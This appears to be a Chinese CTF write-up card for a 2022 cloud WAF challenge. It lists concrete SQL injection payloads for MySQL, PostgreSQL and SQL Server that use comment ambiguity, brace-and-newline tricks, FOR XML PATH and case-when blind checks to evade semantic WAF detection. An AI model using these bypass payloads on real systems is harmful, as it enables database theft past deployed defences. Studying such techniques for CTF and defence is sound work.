---
title: "阿某云-WAF挑战赛wp"
category: web
tags: ["阿某云WAF挑战赛", "web", "SQL注入", "WAF绕", "语义分析", "/**/注释歧义"]
signals: ["阿某云WAF挑战赛 2022", "SQL注入", "WAF绕", "语义分析", "/**/注释歧义", "MySQL报盲注", "PostgreSQL-position", "FOR-XML-PATH", "len/截断", "sqli", "WAF", "SQL", "MySQL", "PostgreSQL"]
difficulty: medium
source: "https://www.ctfiot.com/62086.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 阿某云-WAF挑战赛wp

> 赛事：阿某云WAF挑战赛 2022 | 方向：web | 难度：medium

## 一句话总结

阿某云WAF挑战赛SQL注入绕语义分析:MySQL+PostgreSQL+SQL Server三大数据库/**/注释歧义+{a+换行+information_schema%23%0a.%0atables}花括号+换行+FOR XML PATH+len/截断+case-when绕WAF

## 攻击链

1. MySQL: id=''="/*"=FIELD(if(substr((/*/*/SelEct+table_name+from{a+%0dinformation_schema%23%0a.%0atables}+where+table_schema=''test''+limit+0,1),1,1)=''b'',1,3),1,3)%23|PostgreSQL: id=/*''or+''0''!=position(substr((/*a*/SELECT+flag+from+flag_9740453557b698bee491c3fd9f2f3c69),1,1)+in+''0'')+--+|WAF语义混淆: /*/ 单引号包裹不起注释作用+真注释/*+空格绕过空格|MySQL:{a+%0dinformation_schema%23%0a.%0atables} {}花括号+a+换行+#+换行+点绕过|PostgreSQL:position()返回字符串出现次数>0条件成立|SQL Server:123''AND 1=len(''/*'')/(seleCT -- */name from master..sysdatabases for xml path) --|22329-len(''/*'')/@@version|2-len(''/*'')/(case when substring(db_name(),1,1)=''x'' then 0 else 1 end)

## 经验教训

1) 语义WAF绕:/*被双引号包裹不起注释+真注释/*+空格绕空格=WAF误判为错误语句; 2) MySQL报盲注:FIELD(if(substr+limit+0,1),'b',1,3)=正确/错误; 3) PostgreSQL:position(substr in '0')!=0布尔; 4) {a+%0dinformation_schema%23%0a.%0atables} {}花括号+a+换行(%0d)+#换行(%0a)+点绕过information_schema.columns; 5) SQL Server:len('/*')/(seleCT ... for xml path)截断; 6) case when substring+len+0/1构造布尔

## 标签

SQL注入、WAF绕、语义分析、/**/注释歧义、MySQL报盲注、PostgreSQL-position、FOR-XML-PATH、len/截断、空格替换、换行注释、{}花括号

## 参考来源

- https://www.ctfiot.com/62086.html
- 原文件：阿某云-WAF挑战赛wp.full.md
